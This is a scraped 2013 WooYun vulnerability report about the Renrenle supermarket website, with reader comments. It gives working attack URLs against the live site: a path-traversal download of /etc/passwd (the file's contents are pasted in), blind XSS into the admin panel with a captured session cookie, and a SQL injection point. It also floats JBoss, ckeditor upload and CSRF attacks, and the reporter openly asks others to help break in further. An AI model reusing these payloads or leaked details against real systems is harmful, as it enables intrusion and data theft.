{"id": 13799, "wybug_id": "wooyun-2013-018434", "wybug_title": "人人乐超市网站检测相关（求搞JSP大牛加入）", "wybug_corp": "人人乐", "wybug_author": "whirlwind", "wybug_date": "2013-02-08 11:44", "wybug_open_date": "2013-03-25 11:44", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "设计缺陷", "逻辑错误", "安全意识不足", "设计不当", "后台地址泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-03-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 任意下载文件漏洞，XSS盲打后台，SQL注入，JbossWeb，疑似ckeditor上传漏洞等等。。 详细说明：  首先是任意下载文件 最严重的http://www.renrenle.cn/share/download.jsp?filePath=../../../../../../etc/passwd&fileName=wind.txt没有任何限制\nroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemessagebus:x:102:105::/var/run/dbus:/bin/falsewhoopsie:x:103:106::/nonexistent:/bin/falselandscape:x:104:109::/var/lib/landscape:/bin/falsesshd:x:105:65534::/var/run/sshd:/usr/sbin/nologinxh:x:1000:1000:xiaohong,,,:/home/xh:/bin/bashftp:x:106:113:ftp daemon,,,:/srv/ftp:/bin/falsexiaohong:x:1001:1001::/home/xiaohong:/bin/falseftp1001:x:1002:1002::/home/ftp1001:/bin/falseftp1002:x:1003:1003::/home/ftp1002:/bin/falseftp1003:x:1004:1004::/home/ftp1003:/bin/falseftp1004:x:1005:1005::/home/ftp1004:/bin/falseftp1005:x:1006:1006::/home/ftp1005:/bin/falseftp1006:x:1007:1007::/home/ftp1006:/bin/falsenhy:x:1008:1008::/home/nhy:/bin/falsepostfix:x:107:115::/var/spool/postfix:/bin/false\n下来是XSShttp://www.renrenle.cn/rrlcs/suggest/suggest.jsp这里标题插入代码，可以盲打后台 \nDate: 2013-02-04 16:23:54    OS: Windows XP    Browser: Internet Explorer 8.0    location: http://www.renrenle.cn/rrlcs/admin/manageMessages.jsp?left=1    toplocation: http://www.renrenle.cn/rrlcs/admin/index2.jsp?msg=success    cookie: JSESSIONID=8F1C520080793FC30416BD4532F7E7E4    referrer: http://www.renrenle.cn/rrlcs/admin/side.jsp?moduleid=9\nSQL注入的话，在有cookies时，新闻呀什么的似乎没法访问admin.jsp，不知到是什么原因，不过别的页面确是正常比如http://www.renrenle.cn/rrlcs/admin/managegoods.jsp那么注入点在这里http://www.renrenle.cn/rrlcs/admin/viewgoods.jsp?id=69还有他的服务器是ubuntu 12.04 服务器版，不会搞了，用的是Jbossweb 搭建的网站，任意下载文件可以下载到jboss配置文件，理论上可以通过web管理上传木马，不过遗憾的是，我不会了，似乎端口是8083，不知到怎么的访问不了PS 关于Jboss         [23:47:18] Shawn Smith: 这个是jboss源码 http://www.oschina.net/code/explore/jbossas   2.似乎他还有一个ckeditor，据说可以用%00截断，然后NC上传。这个没测试。不知到她用的ckeditor有没有这个漏洞  3. 网站后台 /admin 还有三个，崇尚百货什么的，能注册后访问，不过似乎没啥用了最后 还是失败了。。第一次搞JSP的站，求大牛教我。。Skype:whirlwind110@live.com   漏洞证明：  大牛自己上吧。。ubuntu下没QQ截图额。。。PS 写道这里，我又想到一个好办法，获取cookies后可以访问一个修改密码的页面，，如果我CSRF的话，，不是管理员密码就有了。。嘿嘿，等下试试哦   修复方案：  送张人人乐购物卡好不好。。。嘿嘿 开玩笑，不求那些，过滤过滤再过滤去练功了。。孩子们晚安啦，人多力量打，求学习。   版权声明：转载请注明来源 whirlwind@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-02-08 11:57 |    \t\t姿势不行 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:7        | 我是爱卖萌的小阿狸呀http://www.qinqinyo....)\t\t \n  快把洞给我~    \n     2013-02-08 14:44 |    \t\twhirlwind \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:8        | 极光肖风)\t\t \n  @姿势不行 真的需要？加我skype啦 whirlwind110@live.com    \n     2013-03-21 10:35 |    \t\tTracker \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 厂商虐我千百遍，我待厂商如初恋!)\t\t \n  关注，skype加你没反应 - -    \n     2013-03-21 21:41 |    \t\twhirlwind \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:8        | 极光肖风)\t\t \n  @Tracker 好久没上网了。。等四月就恢复。。哈哈    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}